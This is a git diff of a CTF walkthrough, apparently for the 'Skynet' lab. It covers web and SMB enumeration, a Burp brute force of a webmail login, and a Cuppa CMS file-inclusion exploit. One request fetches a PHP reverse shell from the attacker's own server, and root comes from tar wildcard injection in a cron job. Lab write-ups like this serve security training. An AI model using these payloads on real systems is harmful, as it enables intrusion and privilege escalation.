@@ -35,7 +35,7 @@ First, let check out the webserver on port 80. It takes use to a skynet search e
 
 ![skynet search](https://github.com/user-attachments/assets/f03da96c-57b1-45b4-9faa-e5f1ff157a88)
 
-Ok, let's try a gobuster scan on the target.
+Ok, let's run gobuster and nikto scans on the target.
 ```bash
 gobuster dir -u $ip -w=/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,txt,html -o bust.txt
 ```
@@ -46,14 +46,14 @@ The scan reveals a few interesting directories:
 ![nikto](https://github.com/user-attachments/assets/3fd6b280-f9c4-4f27-84bb-446aaf06644e)
 
 
-Most of them are forbidden, but squirrelmail takes us to a webmail login. This must be the 110/tcp pop3 port that was revealed in the nmap scan. I tried to log in with some default credentials but no luck. Let's take note of the error message "Unknown user or password incorrect."
+Most of them are forbidden, but squirrelmail takes us to a webmail login. This is the 110/tcp pop3 port that was revealed in the nmap scan. I tried to log in with user name milesdyson and some default credentials but no luck. Let's take note of the error message "Unknown user or password incorrect."
 
 # SMB Enumeration
 Our nmap scan revealed 445/tcp for smbd Samba. 
 
 ![nmap smb](https://github.com/user-attachments/assets/0b5faf0f-148e-4228-88a6-695927533129)
 
-A good tool for digger deeper on this is enum4linux. 
+A good tool for digging deeper on smb shares is enum4linux. 
 ```bash
 enum4linux $ip | tee enum.txt
 ```
@@ -69,8 +69,12 @@ mkdir smb | mv attention.txt log1.txt smb
 
 ![smb files](https://github.com/user-attachments/assets/e1d6ab6d-5abb-4f16-b45e-c923b5873b18)
 
-So we have a message from Miles Dyson about changing passwords and a wordlist, which likely contains a valid password. Let's try to attack Mile's password to squirrelmail.
-Since we're dealing with a pretty small number of possible passwords, I'll just use burp suite to attack the login. Turn on burp proxy to capture the post login request, right click the request and sent to intruder. Leave sniper attack selected and position the payload markers on the password, (in my case I just used admin) as shown in the screen shot. Next, move to the payloads tab, and load the smb wordlist log1.txt and click attack. Before long the password will be revealed as it results in a different status and length:
+So we have a message from Miles Dyson about changing passwords and a wordlist, which likely contains a valid password for his squirrelmail. Let's attack Mile's password to squirrelmail.
+Since we're dealing with a pretty small number of possible passwords, I'll just use burp suite to attack the login. Turn on burp proxy to capture the post login request, then right click on the captured request and sent to intruder. Leave sniper attack selected and position the payload markers on the password, (in my case I just used admin) as shown in the screen shot. 
+
+![burp sniper 1](https://github.com/user-attachments/assets/152713b5-3e7a-4dbd-a8c4-ee85e461a76e)
+
+Next, move to the payloads tab, and load the smb wordlist log1.txt and click attack. Before long the password will be revealed as it results in a different status and length:
 
 ![sniper results](https://github.com/user-attachments/assets/89891a06-33d4-4b14-994a-be277c94fdfc)
 
@@ -88,14 +92,14 @@ you i i i i i everything else . . . . . . . . . . . . . .
 balls have 0 to me to me to me to me to me to me to me to me to
 you i i i everything else . . . . . . . . . . . . . .
 balls have zero to me to me to me to me to me to me to me to me t".
-I did a little research on what this is, and it was reported on a Facebook AI experiment, where bots who were programmed to engage in negotiations began to develop their own language and this was from bot negotiations. Interesting, but unrelated to this CTF's progress. Here's a link to an article if you interested: https://www.poetryfoundation.org/harriet-books/2017/06/balls-have-zero-to-me-to-me-ais-non-human-language
+I did a little research on what this is, and it was reported on a Facebook AI experiment, where bots who were programmed to engage in negotiations and began to develop their own language and this was from those bot negotiations. Interesting, but unrelated to this CTF's progress. Here's a link to an article if you're interested: https://www.poetryfoundation.org/harriet-books/2017/06/balls-have-zero-to-me-to-me-ais-non-human-language
 
-Let's check out the email samba password reset. It sure enough it has Mile's password for smb login.
-Now let's use smbclient again to log onto the smb share:
+Let's check out the email about samba password reset. And sure enough, it has Mile's password for smb login.
+Now let's use smbclient again to log onto the milesdyson smb share:
 ```bash
 smbclient -U milesdyson //$ip/milesdyson
 ```
-And we're in! There's a lot of irrelivent files here, so let's just cd into notes. There's a file called important.txt and I bet it is important. Let's get it.
+And we're in! There's a lot of irrelivent files here, so let's just cd into notes. There's a file called important.txt and I bet <i>it is</i> important. Let's get it.
 
 ![important](https://github.com/user-attachments/assets/8fd28c32-991c-4256-a266-fce4f6941628)
 
@@ -116,7 +120,7 @@ And this reveals an administrator directory:
 
 ![cuppa cms](https://github.com/user-attachments/assets/8a36934b-9b82-4bb1-835d-8a265ca543d4)
 
-I tried logging in with the credentials we found earlier but no luck. Let's try searching for vulnerabilities in this "cuppa cms" with searchsploit.
+I tried logging in with the credentials we found earlier but no luck. Let's search for vulnerabilities for "cuppa cms" with searchsploit.
 
 ![searchsploit](https://github.com/user-attachments/assets/24dcf396-5117-43f4-972f-947882757361)
 
@@ -141,7 +145,7 @@ So, let's try to get the /etc/passwd file first. Our crafted payload should look
 http://10.10.19.189/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
 ```
 And we have the /etc/passwd file, which we will save.
-Now, let's craft a payload based off the the first example to get a reverse shell. We'll head to revshells.com, input your IP and port(I'm using the default 9001. Now scroll down on the left and I'm going to use the PHP Pentest Monkey shell. Save it as a file on your machine. Set up a netcat listener on the listening port in our shell.
+Now, let's craft a payload based off the the first example to get a reverse shell. We'll head to revshells.com, input your IP and port(I'm using the default 9001). Now, scroll down on the left and I'm going to use the PHP Pentest Monkey shell. Save it as a file on your machine. Set up a netcat listener on the listening port in used in our shell.
 ```bash
 nc -lvnp 9001
 ```
@@ -149,7 +153,7 @@ And set up a python server:
 ```bash
 python3 -m http.server
 ```
-Our crafted payload should look like this, except the target IP and whatever your named your shell file:
+Our crafted payload should look like this, except the target IP and whatever you named your shell file:
 ```bash
 http://10.10.33.12/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.184.75:8000/monkey.php
 ```
@@ -175,7 +179,7 @@ I also found an interesting file backups/backup.sh. Root can execute this file b
 
 ![image](https://github.com/user-attachments/assets/71faab58-630e-42a4-b1bd-61611c13d212)
 
-This file is a bash script, that cds to /var/ww/html, and creates a tar archieve to backup.tgz. The * in this case is a wildcard function that can be abused. What we can do because of that * wildcard is inject into for our own purposes. Here is a link to an article about wildcard injection: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/  
+This file is a bash script, that cds to /var/ww/html, and creates a tar archieve to backup.tgz. The * in this case is a wildcard function that can be abused. What we can do, because of that * wildcard, is inject it for our own purposes. If you want to learn more about wildcard injections, here is a link to an article: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/  
 
 Let's use linpeas.sh to get a broad over view of vulnerabilities on the target. If you don't already have it on your machine you can use this command to download it:
 ```bash
@@ -191,17 +195,19 @@ Then run the following commands shown in the screen shot from the target machine
 
 
 # Exploitation
-Now, let's cat output and see what we can find. When we get to the cron jobs there is a very important one that we can use:
+Now, let's cat output and see what we can find. When we get to the cron jobs there is a very important one that we can exploit:
 
 ![cron job](https://github.com/user-attachments/assets/a01be8d8-cfc3-4082-a637-a21b3f7a9c26)
 
-This showing that every minute, root is excuting the backups/backup.sh file That has the potential for a wild card injection. 
-So, what will will do is write our own script called shell.sh. Then injection the shell.sh into the checkpoint so it we be excuted by root, every minute as we saw in he cron job. Because these files are in the html directory the wild card tar function will expand them, and they will be executed to give us root.
-Let's go about this by checking out /bin/bash:
+This is showing that every minute, root is excuting the backups/backup.sh file (That has the potential for a wild card injection). 
+So, what we will do is write our own malicious script called shell.sh. Then inject the shell.sh into the checkpoint so it will be excuted by root, every minute as we saw in he cron job. Because these files are in the html directory, the wild card tar function will expand them, and shell.sh will be executed to give us root privileges.
+Let's go about this by first checking the properties of /bin/bash:
+```bash
+ls -la /bin/bash
+```
 
-We will write a script to have root, make /bin/bash a set uid binary, so that we can invoke it with the command /bin/bash -p to become root.
+We will then write a script to have root, to make /bin/bash a set uid binary, so that we can invoke it with the command /bin/bash -p to become root.
 This process is demonstarted in the screen shot below:
-
 
 ![exploit](https://github.com/user-attachments/assets/83ea6cd9-1d10-4b21-836d-ca3fc2aab4a4)
 
